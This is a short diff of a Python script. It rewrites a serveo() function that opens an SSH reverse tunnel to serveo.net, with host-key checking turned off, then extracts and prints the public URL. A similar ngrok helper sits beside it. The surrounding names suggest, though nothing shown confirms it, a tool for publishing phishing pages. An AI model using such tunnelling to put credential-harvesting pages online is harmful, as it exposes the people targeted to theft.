@@ -293,26 +293,12 @@ def runPEnv():
 
     
 def serveo():
-    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null &')
-    sleep(4)
-    f = open('sendlink.txt', 'r')
-    a = ['\033[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '\033[0m', ' ']
-    lst = []
-    for line in f:
-        for word in a:
-            if word in line:
-                line = line.replace(word,'')            
-        lst.append(line)
-    f.close()
-    f = open('sendlink.txt','w')
-    for line in lst:
-        f.write(line)
-    f.close()
-    url = open('sendlink.txt', 'r')    
-    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
-    url.close()
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
+    sleep(5)
+    output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
+    url = str(output).strip("b ' \ n")
+    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url + "{1}".format(CYAN, END, GREEN))
         
-
 def runNgrok():
     system('./Server/ngrok http 1111 > /dev/null &')
     while True:
